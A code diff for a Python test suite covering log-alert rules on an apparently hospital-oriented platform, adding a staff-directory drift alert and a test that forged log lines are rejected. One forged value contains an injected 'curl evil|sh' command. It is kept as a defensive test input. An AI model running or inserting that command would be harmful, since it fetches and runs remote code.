@@ -86,6 +86,9 @@ STAFF_SERVICES = "backend, provisioner, staff-worker"
 # runner and the restore, a root with no admin or an invalid one, and the operator token
 ROOT_LINE = (r"^ihr-root: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) action=(?:ensure|place) "
              r"outcome=(?:no-admin|invalid|failed) by=[A-Za-z0-9_.-]{1,64}$")
+# The staff directory (deploy/logs/alerts/directory.yml, P1-T31b): our whole fixed line from the
+# restore's one-off (a failed rebuild) or a logged --check run (drift)
+DIRECTORY_LINE = r"^ihr-directory: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=(?:drift|failed)$"
 HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"),
                   "HospitalNotServed": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker"),
                   "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker"),
@@ -93,7 +96,8 @@ HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"
                   "AuditHospitalSealLate": ("ihr-audit", AUDIT_SEAL_LINE, "audit-watch"),
                   "DumpHospitalHeld": ("ihr-dump", DUMP_HELD_LINE, "dumper"),
                   "StaffResetRefused": ("ihr-staff", STAFF_LINE, STAFF_SERVICES),
-                  "HospitalRootProblem": ("ihr-root", ROOT_LINE, "migrate, celery")}
+                  "HospitalRootProblem": ("ihr-root", ROOT_LINE, "migrate, celery"),
+                  "StaffDirectoryDrift": ("ihr-directory", DIRECTORY_LINE, "migrate")}
 # A refused database role (deploy/logs/alerts/db-roles.yml, P1-T19a): our whole fixed line, a
 # role and a reason code (never a value), from the services that run as a declared role
 DB_ROLE_LINE = r"^ihr-db-role: refused role=(?P<role>app|owner|watch|none) reason=(?P<reason>[a-z_]{3,24})$"
@@ -475,7 +479,7 @@ class LogAlerts(unittest.TestCase):
                                          "OperatorSessionNoEnd", "OperatorSessionRefused",
                                          "PackApplyFailed", "PackFacilityDeferred", "ParkedSchemaOverdue",
                                          "PrivilegedLoginUnrecorded", "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
-                                         "SignInLockoutsFromAddress", "StaffResetRefused"])
+                                         "SignInLockoutsFromAddress", "StaffDirectoryDrift", "StaffResetRefused"])
 
     def test_staff_line_is_ours_alone(self):
         """P1-T24b review K5: only the whole fixed line `invitations.log_outcome` writes, with a
@@ -641,6 +645,27 @@ class LogAlerts(unittest.TestCase):
         self.assertIn('f"{LOG_PREFIX} hospital={slug} action={action} outcome={outcome}{count} "', roots)
         self.assertIn('f"by={operator_token(operator)}"', roots)
         self.assertIn('_SAFE = re.compile(r"[^A-Za-z0-9_.-]")', roots)
+
+    def test_directory_line_is_ours_alone(self):
+        """P1-T31b: only the whole fixed line `ihr_identity.directory.log_line` writes (drift, a
+        failed rebuild), from the restore's one-off; never a request path, a longer line, a
+        person's sub or another outcome."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "StaffDirectoryDrift"]
+        self.assertIn('extract_regexp "%s"' % DIRECTORY_LINE, rule["expr"])
+        self.assertNotIn("backend", rule["expr"])
+        line = re.compile(DIRECTORY_LINE)
+        for ok in ("ihr-directory: hospital=alpha outcome=drift", "ihr-directory: hospital=beta outcome=failed"):
+            self.assertIsNotNone(line.match(ok), ok)
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-directory: hospital=fake outcome=drift" 404 1',
+                       "ihr-directory: hospital=alpha outcome=repaired",
+                       "ihr-directory: hospital=Alpha outcome=drift",
+                       "ihr-directory: hospital=x;curl evil|sh; outcome=drift",
+                       "ihr-directory: hospital=alpha outcome=drift sub=0a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d",
+                       "ihr-directory: hospital=alpha outcome=drift\nmore"):
+            self.assertIsNone(line.search(forged), forged)
+        code = (ROOT / "plugins" / "ihr_platform" / "ihr_identity" / "directory.py").read_text()
+        self.assertIn('OUTCOMES = ("drift", "failed")', code)
+        self.assertIn('return f"ihr-directory: hospital={slug} outcome={outcome}"', code)
 
     def test_fleet_line_is_ours_alone(self):
         """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
@@ -886,7 +911,7 @@ class LogAlerts(unittest.TestCase):
                                  "HospitalRestoreFailed": None, "ParkedSchemaOverdue": None,
                                  "MrdRecordsRefused": None, "MrdRecordsVolume": None,
                                  "MrdRecordsOffHours": None, "StaffResetRefused": None,
-                                 "HospitalRootProblem": None,
+                                 "HospitalRootProblem": None, "StaffDirectoryDrift": None,
                                  "PrivilegedLoginUnrecorded": None, "OperatorSessionRefused": None,
                                  "OperatorSessionNoEnd": None, "KeycloakAdminCredentialChange": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
